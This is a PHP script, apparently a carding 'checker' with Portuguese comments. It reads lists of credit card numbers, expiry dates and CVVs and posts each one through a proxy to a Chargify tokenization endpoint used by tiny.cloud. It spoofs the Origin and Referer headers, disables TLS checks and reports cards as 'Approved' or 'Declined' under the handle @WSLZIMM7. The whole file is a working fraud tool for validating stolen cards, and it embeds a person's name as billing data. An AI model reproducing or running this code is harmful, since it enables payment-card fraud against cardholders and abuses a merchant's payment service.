<?php

if (php_sapi_name() == "cli" && isset($argv[1])) {
    parse_str($argv[1], $_GET);
}

$proxy = $_GET['proxy'] ?? "";
$proxy_auth = "";

// Se proxy estiver no formato: user:pass@ip:porta
if (strpos($proxy, "@") !== false) {
    [$auth, $proxy] = explode("@", $proxy);
    $proxy_auth = $auth;
}


error_reporting(0);
ignore_user_abort();
date_default_timezone_set('America/Sao_Paulo');

#############################################

function getStr($separa, $inicia, $fim, $contador) {
    $nada = explode($inicia, $separa);
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'] ?? '';
$lista = trim($lista);
$cartoes = [];

if (!empty($lista)) {
    // Entrada única via GET
    $tmp = explode("|", $lista);
    if (count($tmp) === 4 && preg_match("/^\d{15,16}$/", $tmp[0])) {
        $cartoes[] = $tmp;
    } else {
        echo "Reprovada ➔ Lista inválida\n";
        exit;
    }
} elseif (file_exists('db.txt')) {
    // Leitura de arquivo
    $linhas = file('db.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($linhas as $linha) {
        $linha = trim($linha);
        $parts = explode("|", $linha);
        if (count($parts) === 4 && preg_match("/^\d{15,16}$/", $parts[0])) {
            $cartoes[] = $parts;
        }
    }

    if (empty($cartoes)) {
        echo "Reprovada ➔ Nenhum cartão válido no db.txt\n";
        exit;
    }
} else {
    echo "Reprovada ➔ Nenhuma lista informada e db.txt não encontrado\n";
    exit;
}

$cc  = $cartoes[0][0];
$mes = $cartoes[0][1];
$ano = $cartoes[0][2];
$cvv = $cartoes[0][3];

if (strlen($mes) == 1) {
    $mes = "0$mes";
}

if (strlen($ano) == 2) {
    $ano = "20$ano";
}

if ($mes >= "01" && $mes <= "09") {
    $mesnovo = substr($mes, 1, 1);
} else {
    $mesnovo = $mes;
}

function ln($size) {
    $str = '';
    $numbes = '0123456789abcdef';
    for ($i = 0; $i < $size; $i++) {
        $str .= $numbes[rand(0, strlen($numbes) - 1)];
    }
    return $str;
}

$inicio = microtime(true);

function gerarHash(array $credit_card): string {
    $excluded_fields = ['three_ds_token', 'vault_token', 'customer_vault_token', 'device_data'];

    ksort($credit_card);

    $filtered = array_filter($credit_card, function ($key) use ($excluded_fields) {
        return !in_array($key, $excluded_fields);
    }, ARRAY_FILTER_USE_KEY);

    $values = array_values($filtered);
    $joined = implode("ﾠ", $values);
    return sha1($joined);
}

$credit_card = [
    "full_number" => $cc,
    "expiration_month" => $mesnovo,
    "expiration_year" => $ano,
    "cvv" => $cvv,
    "billing_address" => "travel 122",
    "billing_city" => "gasgas",
    "billing_country" => "US",
    "billing_state" => "NY",
    "billing_zip" => "10080",
    "first_name" => "CELSO",
    "last_name" => "BERGAMO GOBBO",
    "device_data" => ""
];

$hashgenerator = gerarHash($credit_card);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://tiny-technologies.chargify.com/js/tokens.json');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: application/json',
    'Host: tiny-technologies.chargify.com',
    'Origin: https://js.chargify.com',
    'Referer: https://js.chargify.com/'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"chjs_ttrqqj8qf3f29ccwjc6kf7fq","revision":"2025-04-24","credit_card":{"full_number":"'.$cc.'","expiration_month":"'.$mesnovo.'","expiration_year":"'.$ano.'","cvv":"'.$cvv.'","billing_address":"travel 122","billing_city":"gasgas","billing_country":"US","billing_state":"NY","billing_zip":"10080","first_name":"CELSO","last_name":"BERGAMO GOBBO","device_data":""},"origin":"https://www.tiny.cloud","h":"'.$hashgenerator.'"}');
echo $pay = curl_exec($ch);

$erro = getStr($pay, '"errors":"', '"', 1);
$fim = microtime(true);
$tempoTotal = $fim - $inicio;
$tempoFormatado = number_format($tempoTotal, 2);

if(strpos($pay, '"token":"tok_')){

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão autorizado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@WSLZIMM7</span><br>');

}

if(strpos($pay, 'security code is incorrect')){

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão autorizado com sucesso. (CVV2 DECLINED) </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@WSLZIMM7</span><br>');


}

elseif(strpos($pay, 'errors')) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$erro.' </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@WSLZIMM7</span><br>');


}else{

die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-danger">'.$erro.'</span> ➔ <span class="badge badge-warning">Suporte: @WSLZIMM7</span><br>');

}

?>